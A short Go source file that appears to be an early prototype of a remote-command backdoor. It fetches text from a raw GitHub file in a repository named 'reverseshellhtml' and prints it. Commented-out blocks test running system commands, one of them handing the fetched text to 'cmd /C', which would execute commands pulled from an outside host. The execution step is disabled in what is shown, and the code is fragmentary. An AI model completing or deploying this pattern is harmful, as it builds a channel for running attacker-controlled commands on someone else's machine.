package main

import (
	"fmt"
	"github.com/anaskhan96/soup"
	"os"
)

func main() {

	resp1, err1 := soup.Get("https://raw.githubusercontent.com/piedacoulisse2/reverseshellhtml/master/commandes")
	if err1 != nil {
		os.Exit(1)
	}
	doc := soup.HTMLParse(resp1)

	data := doc.Find("body")

	fmt.Println(data.Text())

	// PIPE
	/*	cmd := exec.Command("cat")
		stdin, err := cmd.StdinPipe()
		if err != nil {
			log.Fatal(err)
		}

		go func() {
			defer stdin.Close()
			io.WriteString(stdin, "an old fal")
		}()

		out, err := cmd.CombinedOutput()

		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("%s\n", out)*/

	// Basic commande fonctionne avec WSL2
	/*	cmd := exec.Command("ls", "-lah")
		out, err := cmd.CombinedOutput()
		if err != nil {
			log.Fatalf("cmd.Run() failed with %s\n", err)

		}
		fmt.Printf("combined out \n%s\n", string(out))
	*/

	// Basic commande
	/*	out, err := exec.Command("cmd", "/C", string(data.Text())).Output()
		//out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("Error: ", err)
		}
		fmt.Println(string(out))*/

}
